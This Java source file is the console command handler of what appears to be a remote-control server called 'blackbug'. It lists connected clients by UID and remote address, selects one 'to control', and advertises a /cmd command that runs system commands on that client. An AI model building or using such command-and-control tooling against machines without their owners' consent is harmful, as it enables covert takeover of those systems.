package pers.adlered.blackbug.server.connection;

import pers.adlered.blackbug.server.Temp;
import pers.adlered.blackbug.server.connection.storge.StreamStorge;

import java.util.Iterator;

public class ConsoleHandler {
    public static String handle(String command) {
        String result = "";
        if (command.equals("/help")) {
            result += "======== HELP ========\n";
            result += "/setuid [UID]\n";
            result += "-- Set UID which you want to control\n";
            result += "/list\n";
            result += "-- Show available UID(S)\n";
            result += "/cmd [command]\n";
            result += "-- Run a system command(All system support)\n";
            result += "======== PLEH ========";
        }
        if (command.startsWith("/setuid ")) {
            String UID = command.replaceAll("/setuid ", "");
            Temp.currentUID = Integer.parseInt(UID);
            result += "[Command] UID " + Temp.currentUID + " set.";
        }
        if (command.equals("/list")) {
            result += "======== UID ========\n";
            Iterator<Integer> iterator = StreamStorge.sockets.keySet().iterator();
            while (iterator.hasNext()) {
                int key = iterator.next();
                result += "UID-" + key + " | ";
                result += "bug:/" + StreamStorge.sockets.get(key).getRemoteSocketAddress() + "\n";
            }
            result += "======== DIU ========\n";
        }
        return result;
    }
}
